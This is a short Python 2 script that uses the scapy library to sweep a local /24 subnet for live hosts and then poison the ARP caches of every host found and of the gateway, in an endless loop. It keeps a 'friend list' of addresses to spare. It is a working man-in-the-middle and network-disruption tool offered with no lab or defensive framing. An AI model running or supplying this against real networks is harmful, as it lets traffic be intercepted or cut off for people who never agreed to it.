from scapy.all import *
import time

def getmac(targetip):
  arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
  resp = srp(arppacket, timeout=1 , verbose= False)
  try:
    targetmac= resp[0][0][1].hwsrc
    print targetip +" => "+ targetmac
    return targetmac
  except:
    print targetip +" => Offline"
    return False

def spoofarpcache(targetip, targetmac, sourceip):
  poison= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
  send(poison, verbose= False)

def main():
  gateway_ip= raw_input("Enter Gateway IP:")
  base =  raw_input("Enter Base address (eg '192.168.1.'): ")
  targets_list = []
  start = 2
  end = 255
  excludes = [] #friend list
  print "Searching gateway"
  gateway_mac = getmac(gateway_ip)
  if gateway_mac==False:
    print "gateway unreachable"
    quit()
  print "Scan Started."
  for target_ip in range(start,end):
    target_mac = getmac(base+str(target_ip))
    if target_mac and target_ip not in excludes:
      targets_list.append({"ip":base+str(target_ip),"mac":target_mac})
      
  print str(len(targets_list)) + " hosts found"
  print targets_list
  print "Started poisoning"

  while True:
    for target in targets_list:
      ip = target["ip"]
      mac = target["mac"]
      spoofarpcache(ip, mac, gateway_ip)
      spoofarpcache(gateway_ip, gateway_mac, ip)
      time.sleep(.1)

if __name__=="__main__":
  main()
